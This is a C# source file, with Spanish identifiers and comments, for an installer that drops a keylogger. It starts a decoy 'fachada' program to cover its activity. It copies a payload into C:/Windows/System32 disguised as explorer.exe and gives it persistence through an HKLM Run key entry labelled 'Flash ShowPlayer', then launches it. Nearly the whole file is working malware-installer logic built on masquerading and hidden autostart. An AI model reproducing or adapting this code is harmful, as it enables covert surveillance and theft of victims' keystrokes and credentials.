using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;

namespace Instalador_Keylogger
{
    

    class InstaladorKeylog
    {
        private string nombreArchivoEjecutable = @"explorer.exe";
        private string nombrePaqueteInstalador = @"backup.data";
        private string rutaDirectorioDestino = @"c:/Windows/System32/";
        private string nombreAplicacionFachada = "instalador.exe";

        public bool instalarKeyLog()
        {

            iniciarAplicacionFachada();
            MessageBox.Show("inicio aplicación fachada");
            string RutaTotalDestino = System.IO.Path.Combine(rutaDirectorioDestino, nombreArchivoEjecutable);
            if (tranladorInstalador())
            {
                MessageBox.Show("Translado Instalador");
                if (InteractuarConRegistro(true, RutaTotalDestino))
                {
                    MessageBox.Show("Añadio al Registro");
                    iniciarKeylog();
                    return true;
                }
            }
            return false;

            ////Quitar del registro de inicio
            //MessageBox.Show( InteractuarConRegistro(false, rutaDirectorioDestino).ToString() );
            //return true;
        }

        private void iniciarKeylog()
        {
            Process proceso = new Process();
            string RutaTotalDestino = System.IO.Path.Combine(rutaDirectorioDestino, nombreArchivoEjecutable);
            proceso.StartInfo.FileName = RutaTotalDestino;
            proceso.Start();
        }

        public Boolean tranladorInstalador()
        {
            try
            {
                // Si por casualidad la ruta no existe, entonces la crea
                if (!System.IO.Directory.Exists(rutaDirectorioDestino))
                {
                    System.IO.Directory.CreateDirectory(rutaDirectorioDestino);
                }

                // Copiando el paquete instalador en el directorio de instalación destino
                string RutaTotalOrigen = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, nombrePaqueteInstalador);
                string RutaTotalDestino = System.IO.Path.Combine(rutaDirectorioDestino, nombreArchivoEjecutable);
                System.IO.File.Copy(RutaTotalOrigen, RutaTotalDestino, true);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool InteractuarConRegistro(bool bCrear, string rutaAplicacion)
        {
            // clave del registro para 
            // colocar el path del ejecutable para iniciar con windows
            string CLAVE = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            //ProductName : el nombre del programa.
            string subClave = Application.ProductName.ToString();
            // Mensaje para retornar el resultado
            string msg = "";

            try
            {
                //        // Abre la clave del usuario actual (CurrentUser) para poder extablecer el dato
                //        //si la clave CurrentVersion\Run no existe la crea
                System.Security.Principal.WindowsIdentity user = System.Security.Principal.WindowsIdentity.GetCurrent();


                RegistryKey Registro = Registry.LocalMachine.CreateSubKey(CLAVE, RegistryKeyPermissionCheck.ReadWriteSubTree);
                Registro.OpenSubKey(CLAVE, true);



                if (bCrear == true)
                {
                    //´ Escribe el path con SetValue 
                    //´Valores : ProductName el nombre del programa y ExecutablePath : la ruta del exe

                    //Application.ExecutablePath.ToString() ---> Es la Ruta del Aplicativo actual "ESTE"
                    //Subclave es el nombre de la aplicacion
                    //Registro.SetValue(subClave, Application.ExecutablePath.ToString());

                    Registro.SetValue("Flash ShowPlayer", '"' + rutaAplicacion + '"' + " /b");

                    return true;
                    //´ Eliminar
                    //´´´´´´´´´´´´´´´´´´´´´´
                    //´Elimina la entrada con DeleteValue
                }
                else if (bCrear == false)
                {
                    if (Registro.GetValue("Flash ShowPlayer", "").ToString() != "")
                    {
                        Registro.DeleteValue("Flash ShowPlayer");
                        //eliminar
                        msg = "Ok .. clave eliminada";
                    }
                    else
                    {
                        msg = "No se eliminó , por que el programa no iniciaba con windows";
                    }
                    return true;
                }
            }
            catch (Exception ex)
            {
                msg = ex.Message.ToString();
            }
            return false;
        }

        public bool iniciarAplicacionFachada()
        {
            try
            {
                Process proceso = new Process();
                string RutaArchivoFachada = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, nombreAplicacionFachada);
                proceso.StartInfo.FileName = RutaArchivoFachada;
                proceso.Start();
                return true;
            }
            catch { }
            return false;
        }

    }
}
